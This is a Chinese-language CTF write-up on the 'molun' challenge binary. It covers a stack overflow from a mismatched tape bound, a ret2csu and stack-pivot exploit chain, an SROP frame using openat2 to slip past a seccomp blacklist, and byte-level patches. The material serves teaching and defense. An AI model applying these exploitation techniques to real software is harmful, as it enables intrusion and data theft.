# molun 分析：漏洞 / 通防 / 修法 / 打法

二进制：`attachment/molun`（= `patch/molun`，sha256 `88859ecb…a7c`）、`attachment/molun.bak`
（sha256 `1cbedb61…403b`）；libc：`attachment/libc.so.6` = Ubuntu GLIBC 2.31-0ubuntu9.18。
保护：Full RELRO / Canary / NX / PIE，`.note.gnu.property` 带 IBT+SHSTK（glibc 2.31 环境未启用）。

---

## 1. 哪个版本是「没上过通防」的原题

**`attachment/molun.bak` 是原题**（未通防），`attachment/molun`（= 官方 patch 里的 molun）是上过通防的版本。
两者只差 20 字节：

| 文件 | `0x1180` 处内容 |
|---|---|
| `molun.bak`（原题） | `f3 0f 1e fa` `31 f6` `48 8d 3d 77 0e 00 00` `31 c0` `e9 bc ff ff ff`<br>= `endbr64; xor esi,esi; lea rdi,[rip+0xe77]("./flag"); xor eax,eax; jmp open@plt` |
| `molun`（通防后） | 20 个 `0x90`（NOP） |

判定依据：

1. `.init_array` 是 `[0x1820, 0x1180]`（`readelf -x .init_array` → `2018…` `8011…`），也就是说
   `0x1180` 是**构造函数**。原题启动时先跑 `open("./flag", O_RDONLY)`，fd 3 直接就是 flag。
2. `.bak` 是「打补丁前备份」的命名与时间戳：`molun` 的 mtime 与 `molun.bak` 的创建时间同为
   `14:46:05`，紧接着 `14:46:21` 才生成 `patch/molun`、`14:46:34` 生成 `update.sh`、`14:47:03` 打
   `patch.tar`。顺序是「备份 → 改 → 打包」。
3. 通防那 20 个 NOP 是**贴上去的**、不是重新编译：`init_array[1]` 仍然指向 `0x1180`，NOP 后一路
   落到 `0x11a0`（main），于是 main 被当成构造函数执行一次、`_start` 之后又执行一次。实测程序
   会打印两遍 banner：

   ```
   INKWHEEL-6 // METRO LOOP LINE // SIGNAL BAY 7
   ...
   >   STANDBY
   INKWHEEL-6 // METRO LOOP LINE // SIGNAL BAY 7      <-- 第二次
   ```
4. 同目录其它题（`postbox`、`望海潮`、`钟表`）是同一套模板的产物，都能看到「一份带
   `open("./flag")` 辅助构造函数的原始版 + 一份被改过的部署版」这个组合；`postbox`、`望海潮` 的
   部署版还在 `.eh_frame` 里塞了 126/187 字节的 seccomp 桩，黑名单是
   `open/openat/open_by_handle_at/readlink/readlinkat/execve` + x32 段。molun 这题二进制里本身
   自带 seccomp，所以通防只落到「改 `0x1180`」这一步。

一句话：**通防 = 平台对部署版做的通用硬化**（删掉直接 open flag 的辅助代码，必要时再注入一条
seccomp 黑名单）。它删的是「白送的 fd 3」，不是漏洞。

---

## 2. 漏洞：tape 的容量常数与栈上真实空间不一致

`main`（`0x11a0`）的栈帧只有 `0xd8`，tape 起点是 `rsp+0x80`：

```
rsp+0x00..0x68  seccomp sock_fprog + 7*8 字节 BPF
rsp+0x70        char cmd[16]                  (scanf "%15s")
rsp+0x80        tape 起点                     <- MARK/READBACK 的缓冲区
rsp+0xc8        stack canary                  <- tape[0x48]
rsp+0xd8..0x100 saved rbx,rbp,r12,r13,r14,r15 <- tape[0x58..0x80]
rsp+0x108       saved return address          <- tape[0x88]
```

而四条指令里的容量常数全是 `0x120`（288）：

| 用途 | 地址 | 指令 |
|---|---|---|
| MARK 剩余空间 | `0x13fc` | `mov edx,0x120; sub edx,[0x4058]` |
| READBACK `from` 上界 | `0x1555` | `cmp eax,0x120` |
| READBACK `from+len` 上界 | `0x1562` | `cmp eax,0x120` |
| GAUGE `FREE` | `0x1621` | `mov ecx,0x120` |

于是 `MARK`（每次 ≤0x20 字节、`head+n<=0x120`）可以一路写到 `tape[0x11f] = rsp+0x19f`，把 canary、
保存寄存器、返回地址全盖掉；`READBACK`（`from+len<=0x120`、`len<=0x20`）能把这 0x120 字节原样读回来。
真实可用空间只有 `0x48`（72）字节。

一行验证（把 8 字节写在 `head=0x48`，正好压在 canary 上）：

```
MARK 32 A / MARK 32 B / MARK 8 C   -> HEAD 72 FREE 216
MARK 8 D                            -> 写入 tape[0x48..0x4f] = rsp+0xc8
STANDBY                             -> *** stack smashing detected ***: terminated
```

关键是 canary 可以先读后写，所以 canary 形同虚设：

* `READBACK(0x48, 8)` → canary（首字节 0）
* `READBACK(0x88, 8)` → 返回地址
  * 通防版：`main` 被构造器调用，返回地址在 `__libc_csu_init+0x4d` → **直接泄漏 PIE**
  * 原题：返回地址在 libc，`READBACK(0xa8, 8)` 处存着 `main` 指针 → 泄漏 PIE

题内自带的 seccomp（`main` 开头 `prctl(38,…)` + `prctl(22,2,&fprog)`，7 条 BPF）只杀
`execve(59)` 和 `execveat(322)`，`open/openat/read/write` 全部放行（BPF 逐条解码验证）。

---

## 3. 打法（`exp.py`，PIE-only，不依赖 libc 版本）

1. 泄漏：`READBACK 0x48 / 0x88 / 0xa8` → canary + PIE。
2. 用 9 次 `MARK 32` 把 canary 和 stage-1 写进栈：
   * 借 `main` 的收尾 `pop rbx/rbp/r12/r13/r14/r15`（`0x166c`）+ `ret`（`tape[0x88]`）直接落进
     `__libc_csu_init` 的调用点（`0x1870`）—— `mov rdx,r14; mov rsi,r13; mov edi,r12d;
     call [r15+rbx*8]`，一次 `read(0, pie+0x40e8, 0x400)`（`rbx=0, rbp=1` 让循环只跑一轮）。
   * 调用返回后 `0x1886` 的 6 个 pop 把下一跳设成 `pop rsp; pop r13; pop r14; pop r15; ret`
     （`0x166f`），`rsp := pie+0x40d0` 落到可写页 `[pie+0x4000, pie+0x5000)` 里刚读进来的 stage-2。
3. `STANDBY` → 返回 → `read` 收 stage-2 → 栈迁移 → stage-2 用 `pop rdi` / `pop rsi` +
   `ret2csu` 跑 `open("./flag")` → `read(3, pie+0x4300, 0x100)` → `write(1, …)`。

实测（GLIBC 2.31 与宿主 2.39 都过）：

```
[+] canary = 0x8262ae5f130b3f00   PIE = 0x5ffdf987b000
STANDBY
FLAG{local_test_flag_1234}
```

原题还能更短：flag 已在 fd 3，**不需要 open、不需要 stage-2**，两次 ret2csu
`read(3,buf,0x100)` + `write(1,buf,0x100)` 就打完了（`exp_fd3.py`，实测通过）。

---

## 4. 修法（已字节级验证）

真因是「容量常数 0x120 与栈上真实空间 0x48 不一致」，两种改法都能修，`func.py` 验证功能未坏。

### 修法 A（推荐，改 4 个立即数，16 字节）

把 tape 容量改成真实可用空间 `0x48`：

| 文件偏移 | 原 | 改为 |
|---|---|---|
| `0x13fd`、`0x1556`、`0x1563`、`0x1622` | `20 01 00 00` | `48 00 00 00` |

效果：`HEAD/FREE` 以 72 计；再 `MARK` 报 `TAPE END`；`READBACK 0x48` 报 `NO TAPE`；canary 不可达。
（代价：逻辑 tape 从 288 缩到 72 字节。）

### 修法 B（保留 288 字节 tape，扩大栈帧并把 canary 挪到 tape 之上）

| 文件偏移 | 原 | 改为 | 说明 |
|---|---|---|---|
| `0x11ca` | `d8 00` | `b8 01` | `sub rsp,0xd8` → `sub rsp,0x1b8` |
| `0x1666` | `d8 00` | `b8 01` | `add rsp,0xd8` → `add rsp,0x1b8` |
| `0x11e2` | `c8 00` | `a8 01` | canary 存到 `[rsp+0xc8]` → `[rsp+0x1a8]` |
| `0x1650` | `c8 00` | `a8 01` | canary 校验读 `[rsp+0x1a8]` |

要点：帧长必须 ≡ 8 (mod 16)（`0xd8→0x1b8`，差 0xe0 是 16 的倍数），否则 `printf/scanf` 里的
`movaps` 会因为栈未对齐直接崩；并且**只扩帧不挪 canary 是没用的**——tape 仍会盖到 `0xc8`。

生成脚本 `work/mkfix.py`，补丁产物 `molun.fixA`、`molun.fixB`（`exp.py` 对两者都失败：拿不到泄漏）。

---

## 5. 为什么通防不能防御

1. **没碰漏洞本体**。通防只改了 `0x1180` 那 20 字节的辅助代码，tape 的 `0x120` 边界、
   `frame=0xd8`、canary 位置、缓冲起点一个都没动；溢出与「canary 可读可写」原样保留。
2. **只删了捷径，没删能力**。原题白送 fd 3；通防把 open 代码 NOP 掉，但同一路径 `./flag` 字符串
   还在 `.rodata`（`0x2004`，通防只改了代码、没清字符串），而二进制自带的
   seccomp 只杀 `execve/execveat`，`open` 完全放行 —— exp 里一条 `open("./flag")` 就补回来了。
3. **泄漏面完全没变**。`READBACK` 的边界同样是错的那个 `0x120`，canary、代码段、libc 都能读出来。
4. **通防自己制造了更糟的泄漏点**。NOP 之后 `init_array[1]` 仍指向 `0x1180`，NOP 落到 `main`，
   main 被当作构造函数跑一次，于是 `tape[0x88]` 上躺的是 `__libc_csu_init+0x4d`：**通防版比原题
   多送一个 PIE 泄漏**。同一条 exp 在原题里要靠 `0xa8` 的 `main` 指针，在通防版里 `0x88` 直接给。
5. **就算按 `postbox` 那种「封 open」的通防也没用**：只要启动时 `open("./flag")` 留在构造函数里
   （postbox 的 patch 版就是），fd 3 依旧是 flag，一条 `read(3)` 就够了 —— 本仓库 `exp_fd3.py`
   在 `molun.bak` 上实测：不 open、不 syscall 直连，两次 ret2csu 直接读 fd 3 出 flag。
   通防既没 `close(3)`，也没管 `dup/dup2`，更没动已经打开的 fd。
6. 结论：通防处理的是「白送的 fd」这种**便利性**问题，而这类题的可利用性来自
   （a）越界读写栈帧、（b）泄漏原语、（c）seccomp 放行 open/read/write 三项。三者都在，通防就只是
   多写几条 ROP 而已；真正要修只能改边界/栈帧（见第 4 节）。

---

## 6. 逐级加码：如果通防连「读 flag 的能力」一起删呢

「删掉读 flag 的函数」在本题其实没有对象可删——二进制里只有那条 `open("./flag")`，读文件是攻击者
自己 ROP 出来做的。于是按「能力」逐级加码做了四组实测（都在本机复现，脚本随仓库）：

| 级别 | 通防改了什么 | 结果 | 脚本 / 产物 |
|---|---|---|---|
| L0 | 现状：NOP 掉构造函数里的 `open` | flag 照出（exp 自己 open） | `exp.py` |
| L1 | 再把 `"./flag"` 字符串从 `.rodata 0x2004` 抹掉（`strings` 里已无 `flag`） | flag 照出：路径写在 stage-2 payload 里，用那块内存当 path | `exp_nostr.py` → `molun.nostr` |
| L2 | 再把 seccomp 黑名单加 `open(2)`/`openat(257)`（等价于「删掉把路径变成 fd 的能力」） | 原来的 ROP 链被 `SIGSYS` 打断，无 flag | `molun.noopen`（旧 `exp.py` 真死了，退出码 -31） |
| L3 | 攻击者改用 SROP：`rt_sigreturn` 恢复全部寄存器（含 `r10`），直接调 `openat2(437)` | flag 照出（黑名单漏了 `openat2`） | `exp_srop.py`（打 `molun.noopen`） |

L2 的做法（也是 `postbox` patch 版注入的那套思路）：7 条 BPF 槽位里去掉没用的 arch 检查，改成

```
[0] ld nr | [1] jeq 2 jt=4 | [2] jeq 257 jt=3 | [3] jeq 59 jt=2
[4] jeq 322 jt=1 | [5] ret ALLOW | [6] ret KILL
```

静态解码确认 `2→KILL, 257→KILL, 437→ALLOW`；跑旧 exp 得到 `-31 (SIGSYS)`，程序本身功能正常。

L3 的关键：黑名单是**逐条列举**的，只要漏一条等价的就能绕。这里 `openat2(437)` 就是漏的那条：

```python
fr = SigreturnFrame(kernel='amd64')      # rt_sigreturn 一次恢复 rdi/rsi/rdx/r10/rip/rsp
fr.rax, fr.rdi, fr.rsi = 437, -100, pie + PATH      # openat2(AT_FDCWD, "./flag", &how)
fr.rdx, fr.r10          = pie + HOW, 24             # size 必须给 24（给 8 会被 EINVAL）
fr.rip, fr.rsp          = libc + 0x630a9, pie + CONT
```

`libc + 0x630a9` = `syscall; ret`，`libc + 0x36174` = `pop rax; ret`，libc 基址由
`READBACK(0xc8, 8)` 泄漏（偏移 `0x24010`）。跑通输出：

```
[+] canary=0xa695c7cb07744700 PIE=0x73dae917d000 libc=0x73dae8f89000
STANDBY
FLAG{local_test_flag_1234}
```

更一般地说：只要进程还能执行任意 syscall（本例 `mprotect` 只需要 3 个参数，现有 gadget 就够），
黑名单就永远只能挡住「作者想到的那几条」。真正能把「读 flag 的能力」删掉的做法只有一种形态——
**白名单**（只放 `read/write/exit/exit_group` 之类，且不含 `openat2`/`io_uring_setup`/`open_by_handle_at`
等任何把路径变成 fd 的入口），外加**不留下已打开的 fd**（也就是必须同时删构造函数、必要时 `close(3)`）。
否则删函数、删字符串、加黑名单都只是把 exp 变长，见 L0/L1/L3。

---

## 7. 复现命令

```bash
# 依赖：pwntools；glibc-2.31 的 ld 放同目录即可（work/ld-2.31.so）
python3 exp.py                        # 打 attachment/molun（通防版）
MOLUN_BIN=./molun.bak python3 exp.py  # 打原题
MOLUN_LD=./ld-2.31.so MOLUN_BIN=./molun python3 exp.py   # 用题目自带 2.31 跑
python3 exp_fd3.py                    # 原题专用：只读 fd 3
python3 func.py                       # 功能回归（对 molun.fixA / molun.fixB 同样可用）
# 第 6 节的加码实验
python3 exp_nostr.py                                      # L1：路径自带，打 molun.nostr
MOLUN_BIN=./molun.noopen python3 exp.py                   # L2：旧链被 SIGSYS 打断
MOLUN_BIN=./molun.noopen python3 exp_srop.py              # L3：SROP + openat2 出 flag
```
